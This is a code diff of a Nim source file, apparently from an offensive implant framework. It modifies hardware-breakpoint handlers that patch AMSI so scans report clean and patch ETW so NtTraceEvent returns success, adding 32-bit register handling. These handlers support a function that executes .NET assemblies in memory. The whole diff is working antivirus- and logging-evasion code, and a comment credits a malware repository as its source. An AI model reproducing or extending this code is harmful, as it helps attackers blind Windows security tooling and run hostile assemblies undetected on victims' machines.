@@ -15,16 +15,21 @@ import ../../../common/utils
 #[
     Patching functions
 ]#
-proc amsiPatch(pThreadCtx: PCONTEXT) = 
+proc amsiPatch(pThreadCtx: PCONTEXT) {.stdcall.} =
     # Set the AMSI_RESULT parameter to 0 (AMSI_RESULT_CLEAN)
     SETPARAM_6(pThreadCtx, cast[PULONG](0))
     print protect("    [+] AMSI_SCAN_RESULT set to AMSI_RESULT_CLEAN")
     CONTINUE_EXECUTION(pThreadCtx)
 
-proc etwPatch(pThreadCtx: PCONTEXT) = 
-    pThreadCtx.Rip = cast[PULONG_PTR](pThreadCtx.Rsp)[]
-    pThreadCtx.Rsp += sizeof(PVOID)
-    pThreadCtx.Rax = STATUS_SUCCESS
+proc etwPatch(pThreadCtx: PCONTEXT) {.stdcall.} =
+    when defined(amd64):
+        pThreadCtx.Rip = cast[PULONG_PTR](pThreadCtx.Rsp)[]
+        pThreadCtx.Rsp += sizeof(PVOID)
+        pThreadCtx.Rax = STATUS_SUCCESS
+    else:
+        pThreadCtx.Eip = cast[PULONG_PTR](pThreadCtx.Esp)[]
+        pThreadCtx.Esp += sizeof(PVOID)
+        pThreadCtx.Eax = STATUS_SUCCESS
     print protect("    [+] Return value of NtTraceEvent set to STATUS_SUCCESS")
     CONTINUE_EXECUTION(pThreadCtx)
 
@@ -34,7 +39,7 @@ proc etwPatch(pThreadCtx: PCONTEXT) =
     - assemblyBytes: Serialized .NET assembly 
     - arguments: seq[string] of arguments that should be passed to the function
 ]#
-proc dotnetInlineExecuteGetOutput*(assemblyBytes: seq[byte], arguments: seq[string] = @[]): tuple[assembly, output: string] = 
+proc dotnetInlineExecuteGetOutput*(assemblyBytes: seq[byte], arguments: seq[string] = @[]): tuple[assembly, output: string] =
 
     # Patching AMSI and ETW via Hardware Breakpoints
     # Code from: https://github.com/m4ul3r/malware/blob/main/nim/hardware_breakpoints/hardwarebreakpoints.nim
